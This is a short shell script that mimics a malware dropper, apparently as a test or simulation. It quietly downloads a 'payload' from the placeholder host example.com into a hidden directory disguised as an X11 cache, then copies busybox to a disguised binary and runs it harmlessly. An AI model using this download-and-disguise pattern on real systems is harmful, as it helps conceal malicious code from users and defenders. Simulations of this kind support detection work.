#!/bin/sh
mkdir -p /tmp/.x11-unix-cache
wget -q -T 5 -O /tmp/.x11-unix-cache/payload http://example.com/ 2>/dev/null
cp /bin/busybox /tmp/.x11-unix-cache/upd && chmod +x /tmp/.x11-unix-cache/upd
/tmp/.x11-unix-cache/upd true 2>/dev/null
true
